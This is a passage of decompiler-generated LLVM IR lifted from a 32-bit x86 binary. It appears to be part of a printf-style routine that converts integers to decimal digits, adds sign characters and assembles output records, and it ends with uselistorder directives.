  %v2_80522ab = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80522ab, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_80522c6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80522c6 = inttoptr i32 %v0_80522c6 to i8*
  %v2_80522c6 = load i8, i8* %v1_80522c6, align 1
  %v3_80522c6 = zext i8 %v2_80522c6 to i32
  %v5_80522c6 = and i32 %v2_80522ab, -256
  %v6_80522c6 = or i32 %v3_80522c6, %v5_80522c6
  store i32 %v6_80522c6, i32* %eax.global-to-local, align 4
  %v1_80522c8 = add i32 %v0_80522c6, 1
  store i32 %v1_80522c8, i32* %edi.global-to-local, align 4
  store i32 %v6_80522c6, i32* %stack_var_-22, align 4
  %v2_80522d6 = sub i32 %v1_8052263, %v1_80522c8
  store i32 %v2_80522d6, i32* %edx.global-to-local, align 4
  %v1_80522e0 = icmp eq i32 %v1_805233b, 0
  %v2_80522e0 = icmp slt i32 %v1_805233b, 0
  br i1 %v2_80522e0, label %dec_label_pc_805232f, label %dec_label_pc_80522e4

dec_label_pc_80522e4:                             ; preds = %dec_label_pc_80522ab
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80522f0 = sub i32 %v1_805233b, %v2_80522d6
  %v8_80522f0 = xor i32 %v2_80522d6, %v1_805233b
  %v9_80522f0 = xor i32 %v2_80522f0, %v1_805233b
  %v10_80522f0 = and i32 %v9_80522f0, %v8_80522f0
  %v11_80522f0 = icmp slt i32 %v10_80522f0, 0
  %v13_80522f0 = icmp slt i32 %v2_80522f0, 0
  %v2_80522f2 = icmp eq i1 %v13_80522f0, %v11_80522f0
  br i1 %v2_80522f2, label %dec_label_pc_80522f4, label %dec_label_pc_8052328

dec_label_pc_80522f4:                             ; preds = %dec_label_pc_80522e4
  store i32 %v2_80522f0, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_80522f0, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8052309, label %dec_label_pc_8052324

dec_label_pc_8052309:                             ; preds = %dec_label_pc_80522f4
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8052324

dec_label_pc_8052324:                             ; preds = %dec_label_pc_80522f4, %dec_label_pc_8052309
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8052309 ], [ %stack_var_-132, %dec_label_pc_80522f4 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052344

dec_label_pc_8052328:                             ; preds = %dec_label_pc_80522e4
  %v4_805232a = icmp eq i1 %v1_80522e0, false
  br i1 %v4_805232a, label %dec_label_pc_8052335, label %dec_label_pc_805232c

dec_label_pc_805232c:                             ; preds = %dec_label_pc_8052328
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805232f

dec_label_pc_805232f:                             ; preds = %dec_label_pc_80522ab, %dec_label_pc_805232c
  %v0_805237773 = phi i32 [ %v1_805233b, %dec_label_pc_80522ab ], [ -1, %dec_label_pc_805232c ]
  %v2_805232f = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805232f, i32* @ecx, align 4
  br label %dec_label_pc_8052344

dec_label_pc_8052335:                             ; preds = %dec_label_pc_8052328
  %v2_8052339 = add i32 %v1_80522c8, %v1_805233b
  store i32 %v2_8052339, i32* %edi.global-to-local, align 4
  %v2_805233b = sub i32 %v2_80522d6, %v1_805233b
  store i32 %v2_805233b, i32* %edx.global-to-local, align 4
  %v2_805233d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805233d, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052344

dec_label_pc_8052344:                             ; preds = %dec_label_pc_805232f, %dec_label_pc_8052324, %dec_label_pc_8052335
  %v0_805237772 = phi i32 [ %v0_805237773, %dec_label_pc_805232f ], [ -1, %dec_label_pc_8052324 ], [ -1, %dec_label_pc_8052335 ]
  %v0_8052360 = phi i32 [ %v2_805232f, %dec_label_pc_805232f ], [ %storemerge10, %dec_label_pc_8052324 ], [ %v2_805233d, %dec_label_pc_8052335 ]
  %v0_8052351 = phi i32 [ %v2_80522d6, %dec_label_pc_805232f ], [ 0, %dec_label_pc_8052324 ], [ %v2_805233b, %dec_label_pc_8052335 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_805234b = inttoptr i32 %v1_8051fa3 to i8*
  %v3_805234b = load i8, i8* %v2_805234b, align 1
  %v4_805234b = and i8 %v3_805234b, 16
  %v5_805234b = icmp eq i8 %v4_805234b, 0
  %v1_805234f = icmp eq i1 %v5_805234b, false
  br i1 %v1_805234f, label %dec_label_pc_8052360, label %dec_label_pc_8052351

dec_label_pc_8052351:                             ; preds = %dec_label_pc_8052344
  %v1_8052351 = icmp eq i32 %v0_8052351, 0
  %v1_8052353 = icmp eq i1 %v1_8052351, false
  br i1 %v1_8052353, label %dec_label_pc_8052360, label %dec_label_pc_8052355

dec_label_pc_8052355:                             ; preds = %dec_label_pc_8052351
  br i1 %v12_80521b9, label %dec_label_pc_8052377, label %dec_label_pc_805235c

dec_label_pc_805235c:                             ; preds = %dec_label_pc_8052355
  %v0_805235c = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_805235c, 1
  br i1 %tmp140, label %dec_label_pc_8052377, label %dec_label_pc_8052360

dec_label_pc_8052360:                             ; preds = %dec_label_pc_805235c, %dec_label_pc_8052351, %dec_label_pc_8052344
  %v1_8052360 = inttoptr i32 %v0_8052360 to i32*
  store i32 112, i32* %v1_8052360, align 4
  %v0_8052366 = load i32, i32* @ecx, align 4
  %v1_8052366 = add i32 %v0_8052366, 4
  %v2_8052366 = inttoptr i32 %v1_8052366 to i32*
  store i32 1, i32* %v2_8052366, align 4
  %v0_805236d = load i32, i32* @ecx, align 4
  %v1_805236d = add i32 %v0_805236d, 8
  %v2_805236d = inttoptr i32 %v1_805236d to i32*
  store i32 ptrtoint (i32* @global_var_80573c0.267 to i32), i32* %v2_805236d, align 4
  %v0_8052374 = load i32, i32* @ecx, align 4
  %v1_8052374 = add i32 %v0_8052374, 12
  store i32 %v1_8052374, i32* @ecx, align 4
  %v0_8052377.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052377

dec_label_pc_8052377:                             ; preds = %dec_label_pc_805235c, %dec_label_pc_8052355, %dec_label_pc_8052360
  %v0_805237c = phi i32 [ %v0_8052360, %dec_label_pc_805235c ], [ %v0_8052360, %dec_label_pc_8052355 ], [ %v1_8052374, %dec_label_pc_8052360 ]
  %v0_8052377 = phi i32 [ %v0_805237772, %dec_label_pc_805235c ], [ %v0_805237772, %dec_label_pc_8052355 ], [ %v0_8052377.pre, %dec_label_pc_8052360 ]
  %v1_8052377 = add i32 %v0_8052377, 1
  %v8_8052377 = icmp eq i32 %v1_8052377, 0
  store i32 %v1_8052377, i32* %ebx.global-to-local, align 4
  br i1 %v8_8052377, label %dec_label_pc_8052391, label %dec_label_pc_805237a

dec_label_pc_805237a:                             ; preds = %dec_label_pc_8052377
  store i32 %v1_8052377, i32* %eax.global-to-local, align 4
  %v1_805237c = inttoptr i32 %v0_805237c to i32*
  store i32 176, i32* %v1_805237c, align 4
  %v0_8052382 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052382 = sub i32 0, %v0_8052382
  store i32 %v1_8052382, i32* %eax.global-to-local, align 4
  %v1_8052384 = load i32, i32* @ecx, align 4
  %v2_8052384 = add i32 %v1_8052384, 4
  %v3_8052384 = inttoptr i32 %v2_8052384 to i32*
  store i32 %v1_8052382, i32* %v3_8052384, align 4
  %v0_8052387 = load i32, i32* @ecx, align 4
  %v1_8052387 = add i32 %v0_8052387, 8
  %v2_8052387 = inttoptr i32 %v1_8052387 to i32*
  store i32 ptrtoint (i32* @global_var_80573b3.266 to i32), i32* %v2_8052387, align 4
  %v0_805238e = load i32, i32* @ecx, align 4
  %v1_805238e = add i32 %v0_805238e, 12
  store i32 %v1_805238e, i32* @ecx, align 4
  br label %dec_label_pc_8052391

dec_label_pc_8052391:                             ; preds = %dec_label_pc_8052377, %dec_label_pc_805237a
  %v0_8052395 = phi i32 [ %v0_805237c, %dec_label_pc_8052377 ], [ %v1_805238e, %dec_label_pc_805237a ]
  %v0_8052391 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052391 = icmp eq i32 %v0_8052391, 0
  br i1 %v1_8052391, label %dec_label_pc_80523a4, label %dec_label_pc_8052395

dec_label_pc_8052395:                             ; preds = %dec_label_pc_8052391
  %v1_8052395 = inttoptr i32 %v0_8052395 to i32*
  store i32 112, i32* %v1_8052395, align 4
  %v0_805239b = load i32, i32* %edx.global-to-local, align 4
  %v1_805239b = load i32, i32* @ecx, align 4
  %v2_805239b = add i32 %v1_805239b, 4
  %v3_805239b = inttoptr i32 %v2_805239b to i32*
  store i32 %v0_805239b, i32* %v3_805239b, align 4
  %v0_805239e = load i32, i32* %edi.global-to-local, align 4
  %v1_805239e = load i32, i32* @ecx, align 4
  %v2_805239e = add i32 %v1_805239e, 8
  %v3_805239e = inttoptr i32 %v2_805239e to i32*
  store i32 %v0_805239e, i32* %v3_805239e, align 4
  %v0_80523a1 = load i32, i32* @ecx, align 4
  %v1_80523a1 = add i32 %v0_80523a1, 12
  store i32 %v1_80523a1, i32* @ecx, align 4
  br label %dec_label_pc_80523a4

dec_label_pc_80523a4:                             ; preds = %dec_label_pc_8052391, %dec_label_pc_8052395
  %v0_80523c2 = phi i32 [ %v0_8052395, %dec_label_pc_8052391 ], [ %v1_80523a1, %dec_label_pc_8052395 ]
  br i1 %v1_80521be, label %dec_label_pc_80523b8, label %dec_label_pc_80523ab

dec_label_pc_80523ab:                             ; preds = %dec_label_pc_80523a4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_80523b2 = load i8, i8* %v2_805234b, align 1
  %v4_80523b2 = and i8 %v3_80523b2, 16
  %v5_80523b2 = icmp eq i8 %v4_80523b2, 0
  br i1 %v5_80523b2, label %dec_label_pc_80523d5, label %dec_label_pc_80523b8

dec_label_pc_80523b8:                             ; preds = %dec_label_pc_80523ab, %dec_label_pc_80523a4
  %v0_80523b8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523ba = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523ba = sub i32 %v0_80523b8, %v1_80523ba
  store i32 %v2_80523ba, i32* %eax.global-to-local, align 4
  %v1_80523bc = load i32, i32* %ebp.global-to-local, align 4
  %v2_80523bc = sub i32 %v2_80523ba, %v1_80523bc
  %v8_80523bc = xor i32 %v1_80523bc, %v2_80523ba
  %v9_80523bc = xor i32 %v2_80523bc, %v2_80523ba
  %v10_80523bc = and i32 %v9_80523bc, %v8_80523bc
  %v11_80523bc = icmp slt i32 %v10_80523bc, 0
  %v13_80523bc = icmp slt i32 %v2_80523bc, 0
  %v2_80523be = icmp eq i1 %v13_80523bc, %v11_80523bc
  br i1 %v2_80523be, label %dec_label_pc_80523d5, label %dec_label_pc_80523c0

dec_label_pc_80523c0:                             ; preds = %dec_label_pc_80523b8
  %v2_80523c0 = sub i32 %v1_80523bc, %v2_80523ba
  store i32 %v2_80523c0, i32* %ebp.global-to-local, align 4
  %v1_80523c2 = inttoptr i32 %v0_80523c2 to i32*
  store i32 176, i32* %v1_80523c2, align 4
  %v0_80523c8 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80523c8 = load i32, i32* @ecx, align 4
  %v2_80523c8 = add i32 %v1_80523c8, 4
  %v3_80523c8 = inttoptr i32 %v2_80523c8 to i32*
  store i32 %v0_80523c8, i32* %v3_80523c8, align 4
  %v0_80523cb = load i32, i32* @ecx, align 4
  %v1_80523cb = add i32 %v0_80523cb, 8
  %v2_80523cb = inttoptr i32 %v1_80523cb to i32*
  store i32 ptrtoint (i32* @global_var_80573b3.266 to i32), i32* %v2_80523cb, align 4
  %v0_80523d2 = load i32, i32* @ecx, align 4
  %v1_80523d2 = add i32 %v0_80523d2, 12
  store i32 %v1_80523d2, i32* @ecx, align 4
  br label %dec_label_pc_80523d5

dec_label_pc_80523d5:                             ; preds = %dec_label_pc_80523b8, %dec_label_pc_80523ab, %dec_label_pc_80523c0
  %v1_805245884 = phi i32 [ %v0_80523c2, %dec_label_pc_80523b8 ], [ %v0_80523c2, %dec_label_pc_80523ab ], [ %v1_80523d2, %dec_label_pc_80523c0 ]
  %v12_80523d5 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80523d5, label %dec_label_pc_805244b, label %dec_label_pc_80523dc

dec_label_pc_80523dc:                             ; preds = %dec_label_pc_80523d5
  %v0_80523e3 = load i32, i32* %esi.global-to-local, align 4
  %v2_80523e3 = icmp slt i32 %v0_80523e3, 0
  %v1_80523e5 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_80523e3, i32* %edx.global-to-local, align 4
  br i1 %v2_80523e3, label %dec_label_pc_80523f4, label %dec_label_pc_80523eb

dec_label_pc_80523eb:                             ; preds = %dec_label_pc_80523dc
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80523fd

dec_label_pc_80523f4:                             ; preds = %dec_label_pc_80523dc
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_80523fb = sub i32 0, %v0_80523e3
  store i32 %v1_80523fb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80523fd

dec_label_pc_80523fd:                             ; preds = %dec_label_pc_80523eb, %dec_label_pc_80523f4
  %v0_805241177 = phi i32 [ %v0_80523e3, %dec_label_pc_80523eb ], [ %v1_80523fb, %dec_label_pc_80523f4 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8052405 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8052405, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052411

dec_label_pc_8052411:                             ; preds = %dec_label_pc_8052411.backedge, %dec_label_pc_80523fd
  %v0_805241f = phi i32 [ %v0_8052422, %dec_label_pc_8052411.backedge ], [ 2, %dec_label_pc_80523fd ]
  %v0_805241b = phi i32 [ %v0_805241b.pre, %dec_label_pc_8052411.backedge ], [ %v2_8052405, %dec_label_pc_80523fd ]
  %v0_8052411 = phi i32 [ %v9_8052419, %dec_label_pc_8052411.backedge ], [ %v0_805241177, %dec_label_pc_80523fd ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8052418 = ashr i32 %v0_8052411, 31
  %v2_8052419 = zext i32 %v0_8052411 to i64
  %v4_8052419 = zext i32 %v1_8052418 to i64
  %v5_8052419 = mul nuw i64 %v4_8052419, 4294967296
  %v6_8052419 = or i64 %v5_8052419, %v2_8052419
  %v8_8052419 = sdiv i64 %v6_8052419, 10
  %v9_8052419 = trunc i64 %v8_8052419 to i32
  store i32 %v9_8052419, i32* %eax.global-to-local, align 4
  %v11_8052419 = srem i64 %v6_8052419, 10
  %v12_8052419 = trunc i64 %v11_8052419 to i8
  %v1_805241b = add i32 %v0_805241b, -1
  store i32 %v1_805241b, i32* %ebx.global-to-local, align 4
  %v1_805241c = add i8 %v12_8052419, 48
  %v1_805241f = add i32 %v0_805241f, 1
  store i32 %v1_805241f, i32* %esi.global-to-local, align 4
  %v3_8052420 = inttoptr i32 %v1_805241b to i8*
  store i8 %v1_805241c, i8* %v3_8052420, align 1
  %v0_8052422 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8052419, i32* %edx.global-to-local, align 4
  %v7_8052427 = icmp sgt i32 %v0_8052422, 3
  br i1 %v7_8052427, label %dec_label_pc_8052429, label %dec_label_pc_8052411.backedge

dec_label_pc_8052429:                             ; preds = %dec_label_pc_8052411
  %v2_8052429 = icmp eq i32 %v9_8052419, 0
  %v1_805242b = icmp eq i1 %v2_8052429, false
  br i1 %v1_805242b, label %dec_label_pc_8052411.backedge, label %dec_label_pc_805242d

dec_label_pc_8052411.backedge:                    ; preds = %dec_label_pc_8052429, %dec_label_pc_8052411
  %v0_805241b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052411

dec_label_pc_805242d:                             ; preds = %dec_label_pc_8052429
  %v0_805242d = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805242d, i32* %edx.global-to-local, align 4
  %v0_805242f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805242f = add i32 %v0_805242f, -2
  store i32 %v1_805242f, i32* %eax.global-to-local, align 4
  %v1_8052432 = trunc i32 %v0_805242d to i8
  %v3_8052432 = add i32 %v0_805242f, -1
  %v4_8052432 = inttoptr i32 %v3_8052432 to i8*
  store i8 %v1_8052432, i8* %v4_8052432, align 1
  %v5_8052435 = load i32, i32* %edx.global-to-local, align 4
  %v6_8052435 = and i32 %v5_8052435, -256
  %v7_8052435 = or i32 %v6_8052435, %stack_var_-42.0
  store i32 %v7_8052435, i32* %edx.global-to-local, align 4
  %v2_8052439 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8052439 = add i32 %v2_8052439, -2
  %v4_8052439 = inttoptr i32 %v3_8052439 to i8*
  store i8 %v1_80523e5, i8* %v4_8052439, align 1
  %v0_805243c = load i32, i32* @ecx, align 4
  %v1_805243c = inttoptr i32 %v0_805243c to i32*
  store i32 112, i32* %v1_805243c, align 4
  %v0_8052442 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052442 = load i32, i32* @ecx, align 4
  %v2_8052442 = add i32 %v1_8052442, 4
  %v3_8052442 = inttoptr i32 %v2_8052442 to i32*
  store i32 %v0_8052442, i32* %v3_8052442, align 4
  %v0_8052445 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052445 = load i32, i32* @ecx, align 4
  %v2_8052445 = add i32 %v1_8052445, 8
  %v3_8052445 = inttoptr i32 %v2_8052445 to i32*
  store i32 %v0_8052445, i32* %v3_8052445, align 4
  %v0_8052448 = load i32, i32* @ecx, align 4
  %v1_8052448 = add i32 %v0_8052448, 12
  store i32 %v1_8052448, i32* @ecx, align 4
  br label %dec_label_pc_805244b

dec_label_pc_805244b:                             ; preds = %dec_label_pc_80523d5, %dec_label_pc_8052070, %dec_label_pc_805242d
  %v0_80524cc = phi i32 [ %v1_805245884, %dec_label_pc_80523d5 ], [ %v2_8052078, %dec_label_pc_8052070 ], [ %v1_8052448, %dec_label_pc_805242d ]
  %v2_805244b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805244b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805244f

dec_label_pc_805244f:                             ; preds = %dec_label_pc_805244f, %dec_label_pc_805244b
  %v0_805244f = phi i32 [ %v2_805244b, %dec_label_pc_805244b ], [ %v1_8052451, %dec_label_pc_805244f ]
  %stack_var_-216.0 = phi i32 [ %v3_8051f63, %dec_label_pc_805244b ], [ %v5_8052454, %dec_label_pc_805244f ]
  %v1_805244f = inttoptr i32 %v0_805244f to i32*
  %v2_805244f = load i32, i32* %v1_805244f, align 4
  store i32 %v2_805244f, i32* %edx.global-to-local, align 4
  %v1_8052451 = add i32 %v0_805244f, 12
  store i32 %v1_8052451, i32* %eax.global-to-local, align 4
  %v5_8052454 = sub i32 %stack_var_-216.0, %v2_805244f
  %v7_8052458 = icmp ult i32 %v1_8052451, %v0_80524cc
  br i1 %v7_8052458, label %dec_label_pc_805244f, label %dec_label_pc_805245c

dec_label_pc_805245c:                             ; preds = %dec_label_pc_805244f
  %v5_8052465 = icmp eq i8 %stack_var_-26.0, 0
  %v1_8052475 = icmp eq i1 %v5_8052465, false
  %v2_8052475 = zext i1 %v1_8052475 to i32
  %v2_8052478 = sub i32 %v5_8052454, %v2_8052475
  store i32 %v2_8052478, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_8052478, i32* %eax.global-to-local, align 4
  store i32 %v0_80524cc, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_8052478, 1
  br i1 %tmp141, label %dec_label_pc_80524ce, label %dec_label_pc_805248e

dec_label_pc_805248e:                             ; preds = %dec_label_pc_805245c
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_8052495 = inttoptr i32 %v1_8051fa3 to i8*
  %v3_8052495 = load i8, i8* %v2_8052495, align 1
  %v4_8052495 = and i8 %v3_8052495, 8
  %v5_8052495 = icmp eq i8 %v4_8052495, 0
  br i1 %v5_8052495, label %dec_label_pc_80524b0, label %dec_label_pc_805249b

dec_label_pc_805249b:                             ; preds = %dec_label_pc_805248e
  %v1_805249b = add i32 %v0_80524cc, 12
  store i32 %v1_805249b, i32* %esi.global-to-local, align 4
  %v1_805249e = inttoptr i32 %v0_80524cc to i32*
  store i32 160, i32* %v1_805249e, align 4
  %v0_80524a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80524a4 = load i32, i32* @ecx, align 4
  %v2_80524a4 = add i32 %v1_80524a4, 4
  %v3_80524a4 = inttoptr i32 %v2_80524a4 to i32*
  store i32 %v0_80524a4, i32* %v3_80524a4, align 4
  %v0_80524a7 = load i32, i32* @ecx, align 4
  %v1_80524a7 = add i32 %v0_80524a7, 8
  %v2_80524a7 = inttoptr i32 %v1_80524a7 to i32*
  store i32 ptrtoint (i32* @global_var_80573b3.266 to i32), i32* %v2_80524a7, align 4
  br label %dec_label_pc_80524ce

dec_label_pc_80524b0:                             ; preds = %dec_label_pc_805248e
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80524b7 = add i32 %tmp112, 16
  %v2_80524b7 = inttoptr i32 %v1_80524b7 to i32*
  %v3_80524b7 = load i32, i32* %v2_80524b7, align 4
  %v9_80524b7 = icmp eq i32 %v3_80524b7, 48
  %v1_80524bb = icmp eq i1 %v9_80524b7, false
  br i1 %v1_80524bb, label %dec_label_pc_80524c8, label %dec_label_pc_80524bd

dec_label_pc_80524bd:                             ; preds = %dec_label_pc_80524b0
  %v3_80524bd = load i32, i32* %stack_var_-152, align 4
  %v5_80524bd = add i32 %v3_80524bd, %v2_8052478
  store i32 %v5_80524bd, i32* %stack_var_-152, align 4
  br label %dec_label_pc_80524cc

dec_label_pc_80524c3:                             ; preds = %dec_label_pc_80524d4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80524fb

dec_label_pc_80524c8:                             ; preds = %dec_label_pc_80524b0
  br label %dec_label_pc_80524cc

dec_label_pc_80524cc:                             ; preds = %dec_label_pc_80524bd, %dec_label_pc_80524c8
  store i32 %v0_80524cc, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80524ce

dec_label_pc_80524ce:                             ; preds = %dec_label_pc_805245c, %dec_label_pc_805249b, %dec_label_pc_80524cc
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80524d0 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_80524d0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80524d4

dec_label_pc_80524d4:                             ; preds = %dec_label_pc_80524f2, %dec_label_pc_80524ce
  call void @__pseudo_call(i32 %tmp112)
  %v0_80524ed = load i32, i32* %eax.global-to-local, align 4
  %v1_80524ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80524ed = add i32 %v1_80524ed, 4
  %v3_80524ed = inttoptr i32 %v2_80524ed to i32*
  %v4_80524ed = load i32, i32* %v3_80524ed, align 4
  %v15_80524ed = icmp eq i32 %v0_80524ed, %v4_80524ed
  %v1_80524f0 = icmp eq i1 %v15_80524ed, false
  br i1 %v1_80524f0, label %dec_label_pc_80524c3, label %dec_label_pc_80524f2

dec_label_pc_80524f2:                             ; preds = %dec_label_pc_80524d4
  %v1_80524f2 = add i32 %v1_80524ed, 12
  store i32 %v1_80524f2, i32* %ebx.global-to-local, align 4
  %v0_80524f5 = load i32, i32* %edi.global-to-local, align 4
  %v2_80524f5 = add i32 %v0_80524f5, %v0_80524ed
  store i32 %v2_80524f5, i32* %edi.global-to-local, align 4
  %v1_80524f7 = load i32, i32* %esi.global-to-local, align 4
  %v7_80524f7 = icmp ult i32 %v1_80524f2, %v1_80524f7
  br i1 %v7_80524f7, label %dec_label_pc_80524d4, label %dec_label_pc_80524fb

dec_label_pc_80524fb:                             ; preds = %dec_label_pc_80524f2, %dec_label_pc_80524c3
  %v0_8052501 = phi i32 [ -1, %dec_label_pc_80524c3 ], [ %v2_80524f5, %dec_label_pc_80524f2 ]
  store i32 %v0_8052501, i32* %eax.global-to-local, align 4
  %v2_8052504 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052504, i32* @esi, align 4
  store i32 %v0_8051f46, i32* @edi, align 4
  store i32 %v0_8051f45, i32* @ebp, align 4
  ret i32 %v0_8052501

; uselistorder directives
  uselistorder i32 %v0_8052501, { 1, 0 }
  uselistorder i32 %v1_8052451, { 1, 2, 0 }
  uselistorder i32 %v0_805244f, { 1, 0 }
  uselistorder i32 %v0_80524cc, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8052422, { 1, 0 }
  uselistorder i32 %v9_8052419, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8052411, { 1, 0 }
  uselistorder i32 %v0_80523e3, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80523bc, { 1, 0 }
  uselistorder i32 %v1_80523bc, { 1, 0, 2 }
  uselistorder i32 %v2_80523ba, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80522f0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_80522d6, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805233b, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_80522a1, { 0, 2, 1 }
  uselistorder i32 %v1_805227a, { 1, 0 }
  uselistorder i32 %v0_8052275, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8052242, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_805223d, { 1, 0 }
  uselistorder i8 %v2_8052236, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8052236, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80521c0, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_80521a5, { 1, 0 }
  uselistorder i32 %v1_8052191, { 1, 0 }
  uselistorder i32 %v0_8052185, { 1, 0 }
  uselistorder i32 %v4_805216c, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8052171, { 1, 0 }
  uselistorder i32 %v2_805212f, { 1, 0, 2 }
  uselistorder i3 %v1_8051fe5, { 1, 0 }
  uselistorder i8 %v4_8052064, { 1, 0 }
  uselistorder i32 %v3_8051fa3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_8051fa3, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_8051f75, { 1, 0 }
  uselistorder i32 %v3_8051f63, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder x86_fp80* %st0.global-to-local, { 3, 1, 2, 0 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 10, 9, 11, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7, 8, 9, 23, 10, 11, 24, 13, 14, 12, 18, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80524ce, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80524cc, { 1, 0 }
  uselistorder label %dec_label_pc_805244b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80523fd, { 1, 0 }
  uselistorder label %dec_label_pc_80523d5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80523a4, { 1, 0 }
  uselistorder label %dec_label_pc_8052391, { 1, 0 }
  uselistorder label %dec_label_pc_8052377, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052344, { 2, 0, 1 }
